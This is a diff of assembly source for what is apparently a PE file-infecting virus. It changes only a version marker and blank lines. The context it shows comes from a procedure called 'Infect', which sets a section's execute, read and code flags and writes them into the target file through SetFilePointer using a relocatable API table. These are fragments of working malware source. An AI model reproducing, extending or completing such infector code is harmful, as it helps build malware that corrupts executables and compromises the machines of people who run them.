@@ -16,7 +16,7 @@
 ;;                                                        ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-;VV_VERSION=1.0
+;VV_VERSION=1.1
 
 .386
 .model flat, stdcall
@@ -519,13 +519,10 @@ Infect proc
 	or ebx, IMAGE_SCN_MEM_EXECUTE
 	or ebx, IMAGE_SCN_MEM_READ
 	or ebx, IMAGE_SCN_CNT_CODE;Characteristics in ebx
-
 	mov eax, dword ptr [esp+10h]
 	mov ecx, dword ptr [eax]
 	or ebx,ecx;final characteristics
-
 	mov dword ptr [eax],ebx
-
 	mov eax,dword ptr [esp+8]
 	push FILE_BEGIN
 	push NULL
@@ -534,9 +531,7 @@ Infect proc
 	mov eax,dword ptr [esp+20h]
 	push eax
 	call [edi+ offset _SetFilePointer];file pointer on Characteristics
-
 	mov eax, dword ptr [esp+10h]
-
 	push NULL
 	add eax,4
 	push eax
